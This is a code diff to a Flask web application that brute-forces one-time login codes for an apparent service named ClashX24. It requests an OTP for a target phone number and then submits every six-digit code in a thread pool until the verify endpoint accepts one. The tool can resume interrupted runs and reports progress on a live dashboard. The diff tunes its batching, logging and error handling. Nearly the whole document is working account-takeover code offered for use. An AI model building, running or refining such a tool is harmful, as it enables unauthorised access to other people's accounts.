@@ -1,4 +1,4 @@
-# main.py
+# main.py (Fixed Version)
 import requests
 import time
 import threading
@@ -11,6 +11,7 @@ import os
 import pickle
 import atexit
 import sys
+import traceback
 
 app = Flask(__name__)
 
@@ -31,7 +32,8 @@ brute_force_state = {
     'completed': False,
     'last_otp_tried': 0,
     'otp_sent_response': None,
-    'login_response': None
+    'login_response': None,
+    'error_message': None
 }
 
 log_queue = queue.Queue()
@@ -60,9 +62,8 @@ class ClashX24Login:
             otp_response = self.session.post(send_otp_url, json=otp_payload)
             response_text = otp_response.text
             
-            # Log the response
-            add_log(f"📤 OTP SENT RESPONSE: Status {otp_response.status_code}", "info")
-            add_log(f"📄 Response Body: {response_text}", "info")
+            add_log(f"📤 OTP SENT: Status {otp_response.status_code}", "info")
+            add_log(f"📄 Response: {response_text}", "info")
             
             brute_force_state['otp_sent_response'] = {
                 'status_code': otp_response.status_code,
@@ -91,11 +92,13 @@ class ClashX24Login:
         try:
             verify_response = self.session.post(verify_otp_url, json=verify_payload)
             
-            # Log API response for every attempt
             if show_response:
                 status = "success" if verify_response.status_code != 400 else "warning"
-                add_log(f"🔑 OTP {otp} → Status: {verify_response.status_code}", status)
-                if verify_response.status_code != 400:
+                # Only log every 10th attempt to reduce spam, but always log status 400
+                if verify_response.status_code == 400:
+                    add_log(f"🔑 OTP {otp} → {verify_response.status_code} (wrong)", "warning")
+                elif verify_response.status_code != 400:
+                    add_log(f"🎯 OTP {otp} → {verify_response.status_code} (SUCCESS!)", "success")
                     add_log(f"📄 Login Response: {verify_response.text}", "success")
                     brute_force_state['login_response'] = {
                         'status_code': verify_response.status_code,
@@ -113,8 +116,7 @@ def save_state():
     """Save current state to file"""
     try:
         state_to_save = brute_force_state.copy()
-        # Don't save logs to keep file small
-        state_to_save['logs'] = []
+        state_to_save['logs'] = []  # Don't save logs to keep file small
         with open(STATE_FILE, 'wb') as f:
             pickle.dump(state_to_save, f)
     except Exception as e:
@@ -129,7 +131,6 @@ def load_state():
                 for key, value in loaded_state.items():
                     if key in brute_force_state:
                         brute_force_state[key] = value
-                # Restore logs separately if needed
                 return True
     except Exception as e:
         print(f"Error loading state: {e}")
@@ -152,12 +153,11 @@ def add_log(message, status="info"):
         'status': status
     }
     brute_force_state['logs'].append(log_entry)
-    # Keep only last 1000 logs
-    if len(brute_force_state['logs']) > 1000:
-        brute_force_state['logs'] = brute_force_state['logs'][-1000:]
+    if len(brute_force_state['logs']) > 2000:
+        brute_force_state['logs'] = brute_force_state['logs'][-2000:]
     log_queue.put(log_entry)
-    # Save state periodically for important logs
-    if "✅" in message or "❌" in message or "OTP" in message:
+    # Save state on important events
+    if "✅" in message or "❌" in message or "🎯" in message or "found" in message.lower():
         save_state()
 
 def brute_force_worker(otp, login_instance):
@@ -165,7 +165,7 @@ def brute_force_worker(otp, login_instance):
     if brute_force_state['stop_flag']:
         return None
         
-    response = login_instance.verify_otp(otp, show_response=True)  # Show every attempt
+    response = login_instance.verify_otp(otp, show_response=True)
     
     # Update status counts
     status_code = response.status_code if response else 'error'
@@ -175,6 +175,7 @@ def brute_force_worker(otp, login_instance):
     brute_force_state['last_otp_tried'] = otp
     brute_force_state['total_attempts'] += 1
     
+    # Check if valid OTP found
     if response and response.status_code != 400:
         brute_force_state['found_otp'] = otp
         brute_force_state['stop_flag'] = True
@@ -184,14 +185,14 @@ def brute_force_worker(otp, login_instance):
         save_state()
         return otp
     
-    # Save state every 100 attempts
-    if brute_force_state['total_attempts'] % 100 == 0:
+    # Save state every 500 attempts
+    if brute_force_state['total_attempts'] % 500 == 0:
         save_state()
     
     return None
 
 def run_brute_force(phone_number, max_workers=10, resume_from=0):
-    """Main brute force function"""
+    """Main brute force function - FIXED VERSION"""
     global brute_force_state
     
     with thread_lock:
@@ -213,6 +214,7 @@ def run_brute_force(phone_number, max_workers=10, resume_from=0):
             brute_force_state['speed'] = 0
             brute_force_state['otp_sent_response'] = None
             brute_force_state['login_response'] = None
+            brute_force_state['error_message'] = None
             
             add_log(f"🚀 STARTING BRUTE FORCE", "info")
             add_log(f"📱 Target: {phone_number}", "info")
@@ -229,7 +231,6 @@ def run_brute_force(phone_number, max_workers=10, resume_from=0):
     login_instance.phone_number = brute_force_state['phone_number']
     
     start_time = brute_force_state['start_time'] or time.time()
-    total_attempts = brute_force_state['total_attempts']
     
     # Generate OTPs from 100000 to 999999
     start_otp = max(100000, resume_from)
@@ -238,29 +239,38 @@ def run_brute_force(phone_number, max_workers=10, resume_from=0):
     try:
         with ThreadPoolExecutor(max_workers=max_workers) as executor:
             futures = []
-            batch_size = 500
+            processed_count = 0
             
+            # Submit all tasks in batches
             for otp in range(start_otp, 1000000):
                 if brute_force_state['stop_flag']:
                     add_log("⏹️ Stop signal received", "warning")
                     break
                 
+                # Submit task
                 future = executor.submit(brute_force_worker, otp, login_instance)
                 futures.append(future)
                 
-                if len(futures) >= batch_size:
+                # Process completed futures when batch is full or at end
+                if len(futures) >= max_workers * 2:  # Process in batches of 2x workers
+                    # Process completed futures
+                    completed = []
                     for f in futures:
-                        if brute_force_state['stop_flag']:
-                            break
-                        try:
-                            result = f.result(timeout=0.1)
-                            if result:
-                                executor.shutdown(wait=False, cancel_futures=True)
-                                save_state()
-                                break
-                        except Exception as e:
-                            pass
-                    futures = []
+                        if f.done():
+                            try:
+                                result = f.result(timeout=0.1)
+                                processed_count += 1
+                                if result:  # Found OTP
+                                    add_log(f"✅ FOUND OTP: {result}", "success")
+                                    save_state()
+                                    executor.shutdown(wait=False, cancel_futures=True)
+                                    return result
+                            except Exception as e:
+                                add_log(f"⚠️ Worker error: {str(e)}", "warning")
+                        else:
+                            completed.append(f)
+                    
+                    futures = completed
                     
                     # Update speed
                     elapsed = time.time() - start_time
@@ -275,9 +285,22 @@ def run_brute_force(phone_number, max_workers=10, resume_from=0):
                     
                     if brute_force_state['found_otp']:
                         break
+            
+            # Process remaining futures
+            for f in futures:
+                if not f.done():
+                    try:
+                        result = f.result(timeout=0.1)
+                        if result:
+                            brute_force_state['found_otp'] = result
+                            break
+                    except Exception as e:
+                        pass
     
     except Exception as e:
-        add_log(f"❌ Error in brute force: {str(e)}", "error")
+        error_msg = f"❌ Error in brute force: {str(e)}\n{traceback.format_exc()}"
+        add_log(error_msg, "error")
+        brute_force_state['error_message'] = str(e)
     
     finally:
         with thread_lock:
@@ -289,7 +312,7 @@ def run_brute_force(phone_number, max_workers=10, resume_from=0):
             elif brute_force_state['stop_flag'] and not brute_force_state['found_otp']:
                 add_log(f"⏹️ Stopped by user", "warning")
             else:
-                add_log(f"❌ No valid OTP found", "error")
+                add_log(f"❌ No valid OTP found in range", "error")
             
             add_log(f"⏱️ Total time: {elapsed_time:.2f}s", "info")
             add_log(f"📊 Total attempts: {brute_force_state['total_attempts']}", "info")
@@ -297,7 +320,6 @@ def run_brute_force(phone_number, max_workers=10, resume_from=0):
 
 @app.route('/')
 def index():
-    # Load state on page load
     load_state()
     return render_template('index.html')
 
@@ -310,8 +332,6 @@ def send_otp():
     
     login = ClashX24Login()
     success, response = login.send_otp(phone_number)
-    
-    # Save state after OTP send
     save_state()
     
     return jsonify({
@@ -335,7 +355,6 @@ def start_bruteforce():
         if not phone_number or len(phone_number) != 10 or not phone_number.isdigit():
             return jsonify({'success': False, 'message': 'Invalid phone number'}), 400
         
-        # Load saved state if resuming
         start_from = 0
         if resume and os.path.exists(STATE_FILE):
             load_state()
@@ -346,9 +365,9 @@ def start_bruteforce():
         # Start brute force in background thread
         bruteforce_thread = threading.Thread(
             target=run_brute_force, 
-            args=(phone_number, max_workers, start_from)
+            args=(phone_number, max_workers, start_from),
+            daemon=True
         )
-        bruteforce_thread.daemon = True
         bruteforce_thread.start()
         
         return jsonify({
@@ -383,13 +402,14 @@ def reset_state():
             'completed': False,
             'last_otp_tried': 0,
             'otp_sent_response': None,
-            'login_response': None
+            'login_response': None,
+            'error_message': None
         })
     return jsonify({'success': True, 'message': 'State reset'})
 
 @app.route('/status')
 def status():
-    load_state()  # Reload state from file
+    load_state()
     elapsed = 0
     if brute_force_state.get('start_time'):
         elapsed = time.time() - brute_force_state['start_time']
@@ -408,7 +428,8 @@ def status():
         'last_otp_tried': brute_force_state.get('last_otp_tried', 0),
         'has_saved_state': os.path.exists(STATE_FILE),
         'otp_sent_response': brute_force_state.get('otp_sent_response'),
-        'login_response': brute_force_state.get('login_response')
+        'login_response': brute_force_state.get('login_response'),
+        'error_message': brute_force_state.get('error_message')
     })
 
 @app.route('/logs')
@@ -423,15 +444,11 @@ def stream_logs():
         for log in brute_force_state.get('logs', []):
             yield f"data: {json.dumps(log)}\n\n"
         
-        last_index = len(brute_force_state.get('logs', []))
-        
         while True:
             try:
-                # Get new logs from queue with timeout
                 log = log_queue.get(timeout=10)
                 yield f"data: {json.dumps(log)}\n\n"
             except queue.Empty:
-                # Send heartbeat
                 yield f"data: {json.dumps({'type': 'heartbeat'})}\n\n"
                 continue
             except GeneratorExit:
@@ -445,17 +462,16 @@ def health():
         'status': 'healthy',
         'timestamp': datetime.now().isoformat(),
         'is_running': brute_force_state.get('is_running', False),
-        'has_saved_state': os.path.exists(STATE_FILE)
+        'has_saved_state': os.path.exists(STATE_FILE),
+        'total_attempts': brute_force_state.get('total_attempts', 0)
     })
 
-# Save state on shutdown
 @atexit.register
 def shutdown_cleanup():
     save_state()
     print("State saved on shutdown")
 
 if __name__ == '__main__':
-    # Load state on startup
     load_state()
     port = int(os.environ.get('PORT', 10000))
     app.run(host='0.0.0.0', port=port)
